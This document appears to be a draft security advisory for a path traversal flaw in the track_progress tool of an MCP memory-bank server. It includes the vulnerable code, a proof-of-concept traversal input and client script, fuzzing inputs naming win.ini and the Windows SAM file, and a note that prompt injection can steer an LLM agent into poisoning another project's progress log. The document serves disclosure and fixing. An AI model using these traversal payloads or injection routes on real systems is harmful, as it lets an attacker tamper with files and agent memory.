# Path traversal in `track_progress`: `projectPath` appends to `progress.md` in any directory

**Repository:** `dazeb/cline-mcp-memory-bank` · **Tool:** `track_progress` · **Tested commit:** `55c81b9`
**Weakness:** CWE-22 Path Traversal

## Summary
`track_progress` appends a progress update to `<projectPath>/memory-bank/progress.md`. `projectPath` is used as given, with no check against the configured `PROJECT_PATH` or any other root. Absolute paths and `..` segments both work. A tool call can append caller-written task lists to the progress log of any project on disk that has a memory bank.

## Details
`src/index.ts:737-750` (tested commit):

```ts
private async handleTrackProgress(args: any) {
  const { projectPath, progress } = args;
  if (!projectPath || !progress) {
    throw new McpError(ErrorCode.InvalidParams, 'Project path and progress are required');
  }
  try {
    const filePath = path.join(projectPath, this.memoryBankPath, 'progress.md');
    const currentContent = await fs.readFile(filePath, 'utf8');
    const updatedContent = this.updateProgress(currentContent, progress);
    await fs.writeFile(filePath, updatedContent, 'utf8');
```

`updateProgress` (lines 921-939) writes each `completed`, `inProgress` and `blocked` string verbatim as a Markdown list item. The file name is fixed, so only existing `memory-bank/progress.md` files are reachable. The server's `PROJECT_PATH` (line 303) is not consulted.

## Steps to reproduce
1. Prerequisites: Node.js 18+ and pnpm.
2. Install and build as the README describes: `git clone https://github.com/dazeb/cline-mcp-memory-bank && cd cline-mcp-memory-bank && pnpm install && pnpm run build`.
3. Create a stand-in project outside the working directory:

   ```sh
   mkdir -p /tmp/tofu-poc-project/memory-bank
   printf '# Progress Log\n' > /tmp/tofu-poc-project/memory-bank/progress.md
   ```

   Then call the tool with:

   ```json
   {"projectPath": "../../../../../../../../tmp/tofu-poc-project",
    "progress": {"completed": ["tofu-poc"], "inProgress": []}}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(command="node", args=["build/index.js"])
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("track_progress", {
                   "projectPath": "../../../../../../../../tmp/tofu-poc-project",
                   "progress": {"completed": ["tofu-poc"], "inProgress": []}})
               print(result)

   asyncio.run(main())
   ```
4. Observe the reply `Progress updated successfully`, and a new `## Update (...)` block listing `tofu-poc` in `/tmp/tofu-poc-project/memory-bank/progress.md`.

## Expected behavior
`projectPath` must resolve inside the configured project root, or the call is rejected.

## Actual behavior
Any path whose `memory-bank/progress.md` exists is accepted. In the fuzzing run:

```
input:  {'projectPath': '..\\..\\..\\..\\windows\\win.ini', 'progress': {'completed': [], 'inProgress': ['compile', 'test'], 'blocked': ['..\\..\\..\\..\\windows\\system32\\config\\SAM']}}
output: Progress updated successfully
```

The backslash path is a literal directory name on the Linux test host. An earlier `initialize_memory_bank` call had created it in the working directory. The `/`-separated form above leaves the working directory.

## Impact
The LLM picks `projectPath` and the task strings, and prompt injection can steer both. An attacker can append text to another project's progress log, which agents read back as project memory. Writes are append-only and limited to existing `memory-bank/progress.md` files. Low severity.

## Suggested fix
Use one helper for all four tools: resolve `projectPath` with `path.resolve` and `fs.realpath`, then reject it unless it equals `PROJECT_PATH` or starts with `PROJECT_PATH + path.sep`. Alternatively, ignore the argument and use `PROJECT_PATH` directly.

## Status on the default branch
Still present at `55c81b9` (2025-07-17). The tested commit is the current default branch head.

## Prior reports
- #5 "Path Traversal Vulnerability in dazeb/cline-mcp-memory-bank" (issue, open 2026-04-27): reports the same unchecked `projectPath` reaching `fs.readFile`/`fs.writeFile` in `handleInitializeMemoryBank`, `handleUpdateContext`, `handleRecordDecision` and `handleTrackProgress` at the same commit `55c81b9`. Still open, and the default branch has no commit after 2025-07-17, so it is unfixed; this draft duplicates it.
- Documentation: README.md: the tool examples pass `projectPath: '/path/to/project'`, so absolute paths are the documented usage. No allowed root or warning is documented.

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: already reported in #5 (open, unfixed at 55c81b9). File only as a comment on #5, or not at all.
- ToFu class / sanitizers: path-traversal (CWE-22); `check_path_traversal`, `check_invalid_json`.
- Campaigns and executions: corpus-sbx 2560 exec / 343 ok; repo24-b 295424 / 13995; e2-0922 1024 / 36.
- Evidence (verbatim, trimmed):
  - `{'projectPath': '..\\..\\..\\..\\windows\\win.ini', 'progress': {'completed': [], 'inProgress': ['compile', 'test'], 'blocked': ['..\\..\\..\\..\\windows\\system32\\config\\SAM']}}` -> `Progress updated successfully`
  - two near-identical variants -> same output
- Hand-check hints: real but low. Unchecked `path.join(projectPath, ...)` into `fs.readFile`/`fs.writeFile`. The `blocked` entries in the evidence are only strings written into Markdown, not paths. All logged inputs stayed inside cwd on Linux; the escape rests on code reading. Repro not run. File together with the other memory-bank tools.
</details>
